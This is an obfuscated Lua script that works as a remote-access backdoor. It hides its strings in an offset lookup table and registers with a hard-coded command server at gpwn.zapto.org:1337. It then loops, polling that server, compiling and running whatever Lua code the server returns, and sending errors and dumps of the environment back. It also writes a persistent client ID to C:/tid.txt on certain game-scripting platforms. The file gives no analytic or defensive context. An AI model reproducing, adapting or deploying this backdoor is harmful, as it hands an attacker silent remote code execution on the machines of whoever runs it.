local cLs = "|0l\010:.1p[	x2=G<%>\092\034 rw&5f6\092t\092ept [,  \034\092o]\010tf (\092q\092\092: \092s\092n\092c\092p):\092a[^==()%%=]sublengetspluidregchkrepb64\034:\010]:\010]: workhttpCallNONE%%%1portgsubopen]: [namecharfindfmod0000bytetablefloorchk_rtnameupperp_rawlowersleepnumberrandomrunluagmatchserverconcatTurtlestringExplodeReplaceb64_encworkingb64_decaddressturtle@requestERROR:\010gettimechk_lastIntToHexhttp_oldEndsWithfunctionpwnpusesdownloadERROR IN StartWithhttp_proxychk_failedC:/tid.txtold_printssetintervalhttp_turtleStringToHexaddress_fullchk_intervalreplycommands-------------HTTP_CALLBACKpwnp_block_allSYNTAX ERROR:\010%d%d%d?%d?%d?%d?fsender_interval0123456789ABCDEFpwnp_blocked_text%d%d%d?%d?%d?%d?%d?%d?[%-%^%$%(%)%%%.%[%]%*%+%-%?]pwn.Call: argument list is not valid. Values: ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local sSs = string.sub
local q = function(a, b)
	return sSs(cLs, a, b + a)
end
pwn = {  }
pwn[q(14, 0)] = _G
pwn[q(99, 2)] = true
string[q(266, 6)] = function(w, e, r)
	e = e:gsub(q(654, 27), q(127, 3))
	r = r:gsub(q(71, 1), q(127, 3))
	return (w:gsub(e, r))
end
string[q(394, 8)] = function(w, e)
	return string[q(75, 2)](w, 1, string[q(78, 2)](e)) == e
end
string[q(353, 7)] = function(w, e)
	return e == q(1, -1) or string[q(75, 2)](w, -string[q(78, 2)](e)) == e
end
string[q(259, 6)] = function(w, e, r)
	if (w == q(1, -1)) then
		return totable(e)
	end

	local t = {  }
	local y, u = 1, 1
	if not r then
		w = string[q(135, 3)](w, q(654, 27), q(127, 3))
	end

	for i, o in string[q(229, 5)](e, q(69, 1)..w..q(69, 1)) do
		t[y] = string[q(75, 2)](e, u, i - 1)
		y = y + 1
		u = o
	end

	t[y] = string[q(75, 2)](e, u)
	return t
end
istable = function(w)
	return type(w) == q(171, 4)
end
isstring = function(w)
	return type(w) == q(253, 5)
end
isfunction = function(w)
	return type(w) == q(361, 7)
end
isnumber = function(w)
	return type(w) == q(211, 5)
end
CompileString = function(w, e, r)
	local t, y
	if load then
		t, y = load(w, e)
	else
		t, y = loadstring(w, e)
	end

	return t or y
end
CurTime = function()
	return socket[q(322, 6)]()
end
pwn[q(476, 11)] = "http://gpwn.zapto.org:1337/"
pwn[q(294, 6)] = pwn[q(476, 11)]
pwn[q(131, 3)] = 1337
pwn[q(583, 15)] = 0.15
pwn[q(488, 11)] = 1
pwn[q(84, 2)] = "?a="
pwn[q(280, 6)] = true
pwn[q(413, 9)] = 0
pwn[q(329, 7)] = ""
pwn[q(500, 12)] = false
pwn[q(87, 2)] = "plg@178_32_52_59"
pwn[q(186, 4)] = "178_32_52_59"
pwn[q(403, 9)] = 0
pwn[q(443, 10)] = function(w)
	pwn[q(488, 11)] = w
end
pwn[q(147, 3)] = function(w)
	pwn[q(186, 4)] = w
	pwn[q(90, 2)]()
end
DEC_HEX = function(w)
	local e, r, t, y, u = 16, q(599, 15), q(1, -1), 0
	while w > 0 do
		y = y + 1
		u = math[q(159, 3)](w, e)
		w = math[q(176, 4)](w / e)
		u = u + 1
		t = string[q(75, 2)](r, u, u)..t
	end

	return t
end
pwn[q(337, 7)] = function(w)
	local e = DEC_HEX(w)
	if string[q(78, 2)](e) == 1 then
		e = q(2, 0)..e
	end

	return e
end
local w = q(728, 63)
pwn[q(273, 6)] = function(e)
	return ((e:gsub(q(6, 0), function(r)
		local t, y = q(1, -1), r:byte()
		for u = 8, 1, -1 do
			t = t..(y % 2 ^ u - y % 2 ^ (u - 1) > 0 and q(7, 0) or q(2, 0))
		end

		return t
	end)..q(163, 3)):gsub(q(567, 15), function(r)
		if (#r < 6) then
			return q(1, -1)
		end

		local t = 0
		for y = 1, 6 do
			t = t + (r:sub(y, y) == q(7, 0) and 2 ^ (6 - y) or 0)
		end

		return w:sub(t + 1, t + 1)
	end)..({ q(1, -1), q(67, 1), q(13, 0) })[#e % 3 + 1])
end
pwn[q(287, 6)] = function(e)
	e = string[q(135, 3)](e, q(65, 1)..w..q(73, 1), q(1, -1))
	return (e:gsub(q(6, 0), function(r)
		if (r == q(13, 0)) then
			return q(1, -1)
		end

		local t, y = q(1, -1), (w:find(r) - 1)
		for u = 6, 1, -1 do
			t = t..(y % 2 ^ u - y % 2 ^ (u - 1) > 0 and q(7, 0) or q(2, 0))
		end

		return t
	end):gsub(q(632, 21), function(r)
		if (#r ~= 8) then
			return q(1, -1)
		end

		local t = 0
		for y = 1, 8 do
			t = t + (r:sub(y, y) == q(7, 0) and 2 ^ (8 - y) or 0)
		end

		return string[q(151, 3)](t)
	end))
end
pwn[q(465, 10)] = function(e)
	if pwn[q(99, 2)] then
		return q(11, 0)..pwn[q(273, 6)](e)
	end

	if not e then
		return q(1, -1)
	end

	local r = q(1, -1)
	for t = 1, string[q(78, 2)](e) do
		r = r..pwn[q(337, 7)](string[q(167, 3)](e, t))
	end

	return r
end
pwn[q(196, 4)] = function(e)
	pwn[q(115, 3)](pwn[q(294, 6)]..pwn[q(87, 2)]..pwn[q(84, 2)]..q(12, 0)..pwn[q(465, 10)](tostring(e)))
end
pwn[q(433, 9)] = {  }
pwn[q(369, 7)] = 0
pwn[q(615, 16)] = {  }
pwn[q(539, 13)] = false
pwn[q(8, 0)] = function(...)
	local e = { ... }
	for r, t in pairs(e) do
		e[r] = tostring(t)
	end

	text = table[q(241, 5)](e, q(10, 0))
	if pwn[q(539, 13)] then
		return nil
	end

	if pwn[q(615, 16)][text] then
		return nil
	end

	pwn[q(196, 4)](text)
end
pwn[q(119, 3)] = function(e, r, t, ...)
	if isstring(e) and isstring(r) and isfunction(t) then
		local y, u = pcall(t, ...)
		if not y then
			pwn[q(8, 0)](q(385, 8)..string[q(191, 4)](e)..q(37, 1)..r..q(102, 2)..u)
		end

		return y, u
	else
		pwn[q(8, 0)](q(682, 45)..tostring(e)..q(35, 1)..tostring(r)..q(35, 1)..tostring(t))
		return false
	end

end
pwn[q(31, 1)] = function(e, r, t, y, u)
	r = r or 0
	u = u or 0
	local i = q(1, -1)
	local o = string[q(96, 2)](q(10, 0), u)
	for p, a in pairs(e) do
		if not y or y(p, a) then
			if istable(a) and r ~= 0 then
				if t then
					i = i..o..type(p)..q(33, 1)..p..q(105, 2)..pwn[q(31, 1)](a, r - 1, t, y, u + 1)
				else
					i = i..o..q(9, 0)..p..q(105, 2)..pwn[q(31, 1)](a, r - 1, t, y, u + 1)
				end

			else
				if t then
					i = i..o..type(p)..q(33, 1)..p..q(108, 2)..type(a)..q(33, 1)..tostring(a)..q(41, 1)
				else
					i = i..o..q(9, 0)..p..q(143, 3)..tostring(a)..q(41, 1)
				end

			end

		end

	end

	if u == 0 then
		pwn[q(8, 0)](i..q(513, 12))
	else
		return i
	end

end
pwn[q(43, 1)] = function(e, r, t)
	local y = q(1, -1)
	r = r or q(1, -1)
	if (t) then
		for u, i in pairs(e) do
			if not (string[q(155, 3)](u, r, 1, true) == nil) then
				y = y..u..q(51, 1)..type(i)..q(4, 0)
			end

		end

	else
		r = string[q(201, 4)](r)
		for u, i in pairs(e) do
			if not (string[q(155, 3)](string[q(201, 4)](u), r, 1, true) == nil) then
				y = y..u..q(45, 1)..type(i)..q(61, 1)..tostring(i)..q(4, 0)
			end

		end

	end

	pwn[q(8, 0)](y..q(513, 12))
end
pwn[q(3, 0)] = function(e, r, t, y)
	local u = q(1, -1)
	if y then
		for i, o in pairs(y) do
			u = u..(i == 1 and q(1, -1) or q(1, 0))..table[q(241, 5)](o, q(5, 0))
		end

	end

	pwn[q(115, 3)](pwn[q(294, 6)]..pwn[q(87, 2)]..pwn[q(84, 2)]..q(26, 0)..(r and pwn[q(465, 10)](r) or q(1, -1))..q(1, 0)..pwn[q(465, 10)](u)..q(1, 0)..(t and q(7, 0) or q(2, 0))..pwn[q(465, 10)](tostring(e)))
end
local e = 0
pwn[q(90, 2)] = function()
	local r, t
	r = pwn[q(87, 2)]
	t = pwn[q(186, 4)]
	pwn[q(115, 3)](pwn[q(294, 6)]..pwn[q(87, 2)]..pwn[q(84, 2)]..q(2, 0)..r..q(1, 0)..pwn[q(465, 10)](tostring(pwn[q(403, 9)]))..q(1, 0)..pwn[q(465, 10)](q(235, 5))..q(1, 0)..pwn[q(465, 10)](t))
end
pwn[q(223, 5)] = function(r, t)
	local y = CompileString(r)
	if type(y) ~= q(361, 7) then
		pwn[q(8, 0)](q(553, 13)..y)
	else
		local u, i = pcall(y)
		if not u then
			pwn[q(8, 0)](q(315, 6)..i)
		end

	end

end
pwn[q(93, 2)] = function()
	pwn[q(413, 9)] = pwn[q(413, 9)] + pwn[q(488, 11)]
	pwn[q(115, 3)](pwn[q(294, 6)]..pwn[q(87, 2)]..pwn[q(84, 2)]..q(7, 0), pwn[q(181, 4)])
end
pwn[q(181, 4)] = function(r, t)
	if string[q(78, 2)](r) > 5 then
		if string[q(78, 2)](r) == 12 then
			if string[q(394, 8)](r, q(123, 3)) and string[q(353, 7)](r, q(123, 3)) then
				if not (r == pwn[q(329, 7)]) then
					pwn[q(413, 9)] = 0
					pwn[q(329, 7)] = r
				end

				return 
			end

		end

		pwn[q(329, 7)] = r
		if pwn[q(500, 12)] then
			pwn[q(8, 0)](r)
		end

		pwn[q(223, 5)](r)
	end

end
pwn[q(25, 0)] = function(r)
	local t = r
	t = string[q(266, 6)](t, q(18, 0), q(49, 1))
	t = string[q(266, 6)](t, q(4, 0), q(55, 1))
	t = string[q(266, 6)](t, q(20, 0), q(53, 1))
	t = string[q(266, 6)](t, q(19, 0), q(47, 1))
	t = string[q(266, 6)](t, q(15, 0), q(39, 1))
	t = string[q(266, 6)](t, q(17, 0), q(57, 1))
	t = string[q(266, 6)](t, q(16, 0), q(59, 1))
	t = string[q(266, 6)](t, q(23, 0), q(63, 1))
	t = string[q(266, 6)](t, q(36, 1), q(27, 1))
	t = string[q(266, 6)](t, q(13, 0), q(29, 1))
	return t
end
pwn[q(115, 3)] = function(r, t, y)
	local u = http[q(308, 6)](r)
	if (u) then
		local i = u
		if t then
			t(i, string[q(78, 2)](i))
		end

	else
		if y then
			y()
		end

	end

end
pwn[q(345, 7)] = function(r, t, y, u)
	local i, o = pcall(http[q(308, 6)], r, t)
	if not i then
		return 
	end

	if (o) then
		local p = o
		if y then
			y(p, string[q(78, 2)](p))
		end

	else
		if u then
			u()
		end

	end

end
pwn[q(454, 10)] = function(r, t, y)
	local u = http[q(81, 2)](r)
	local i
	if not u then
		return 
	end

	local o = u:readAll()
	if o then
		if t then
			pwn[q(119, 3)](q(526, 12), r, t, o, string[q(78, 2)](o))
		end

	else
		if y then
			y()
		end

	end

end
pwn[q(377, 7)] = function(r)
	local t = q(1, -1)
	local y = -1
	local u
	pwn[q(115, 3)](pwn[q(294, 6)]..pwn[q(87, 2)]..pwn[q(84, 2)]..q(24, 0)..r..q(1, 0)..t..q(1, 0)..y..q(1, 1), function(i)
		u = i
	end)
	u = pwn[q(287, 6)](u)
	return u
end
if rednet then
	local r = math[q(217, 5)](10000, 99999)
	local t = io[q(139, 3)](q(423, 9), q(21, 0))
	if not t then
		t = io[q(139, 3)](q(423, 9), q(22, 0))
		t:write(r)
		t:close()
	else
		r = t:read()
		t:close()
	end

	pwn[q(115, 3)] = pwn[q(454, 10)]
	pwn[q(87, 2)] = q(301, 6)..r
	pwn[q(294, 6)] = pwn[q(476, 11)]
	pwn[q(186, 4)] = q(247, 5)
end

pwn[q(111, 3)] = function()
	while true do
		local r = sleep or socket[q(206, 4)]
		r(pwn[q(488, 11)])
		pwn[q(115, 3)](pwn[q(476, 11)]..pwn[q(87, 2)]..pwn[q(84, 2)]..q(7, 0), pwn[q(181, 4)])
		if not pwn[q(280, 6)] then
			return 
		end

	end

end
pwn[q(90, 2)]()
pwn[q(111, 3)]()
